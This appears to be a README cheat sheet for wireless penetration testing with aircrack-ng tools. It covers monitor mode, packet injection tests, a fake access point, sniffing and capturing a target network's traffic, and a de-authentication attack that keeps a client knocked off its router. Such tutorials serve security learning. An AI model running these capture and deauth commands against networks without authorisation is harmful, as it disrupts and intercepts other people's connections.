# <p style="text-align:center">Ethical Hacking Cheat Sheet </p>
---
<details>
    <summary> Basic Information</summary>
These commands are works only on linux based OS system
An external Network Adapter is required, Your Network Adapter must support
<span style="color: orange">Monitor Mode, packet injection mode </span> Here my network interface name is <span style="color: orange">wlan1</span>, use these commands

```sh
iwconfig 
```
 or 
 ```
 ifconfig
 ```
check your network interface name, your network interface name may be diffrent use accordingly.

First you need to switch root user

```
sudo su
```
</details>

# Table of Content
- [Network Manager Commands](https://github.com/ohm-vishwa/Ethical_Hacking?tab=readme-ov-file##network-manager-commands)
- [Network Adapter testing commands](https://github.com/ohm-vishwa/Ethical_Hacking?tab=readme-ov-file##network-adapter-testing-commands)
- [Packet Sniffing](https://github.com/ohm-vishwa/Ethical_Hacking?tab=readme-ov-file##packet-sniffing)
- [DE-Authentication Attack](https://github.com/ohm-vishwa/Ethical_Hacking?tab=readme-ov-file##de-authentication-attack)

---
## Network Manager Commands
### kill network manager
```
airmon-ng check kill
```
### Enable Network Manager
```
service NetworkManager start
```
### Restart Network Manager
```
systemctl restart NetworkManager
```
### Check Status of Network Manager
```
systemctl status NetworkManager
```
---
## Network Adapter Testing Commands
### Enable Monitor Mode
```
airmon-ng start wlan1
```
### Disable Monitor Mode
```
airmon-ng stop wlan1
```
### Packet Injection test
```
aireplay-ng --test wlan1
```
### Creating Access Point Test
you can put any fake MAC Address like this `00:01:02:03:04:05`
```
airbase-ng -a 00:01:02:03:04:05 --essid "test_01" -c 11 wlan1
```
---
## Packet Sniffing
### sniff network around us `2.4 GHz`
```
airodump-ng wlan1
```
### sniff network Both `2.4 GHz and 5 GHz`
```
airodump-ng --band a wlan1
```
### capture data both `2.4 GHz and 5 GHz`
```
airodump-ng --band abg wlan1
```
### capture data in a file `test`
```
airodump-ng --bssid @1 --channel @2 --write test wlan1
```
@1 → `BSSID` of target

@2 → Channel no. of target

### open wireshark application to read captured data, captured in `fileName.cap`, 
```
wireshark
```
---
## DE-Authentication Attack
```
aireplay-ng --deauth @1 -a @2 -c @3 wlan1
```
@1 → no. of packets you want to send 

@2 → BSSID of router

@3 → MAC Address of the Client
<details>
    <summary>know more abot it</summary>
we're doing --deauth to tell
aireplay-ng that I want to run a de-authentication attack,
I'm givin' it a really large number of packets, so that it
keeps sending the de-authentication packets
to both the router and the client, and keep the client
disconnected, I'm using -a to specify the MAC address of the
target router, or the target access point, then I'm using -c
to specify the MAC address of the client.
</details>
&nbsp;

if it`s fails then, ot target specific router
```
airodump-ng --bssid @1 --channel @2 wlan1
```
@1 → BSSID of target

@2 → Channel number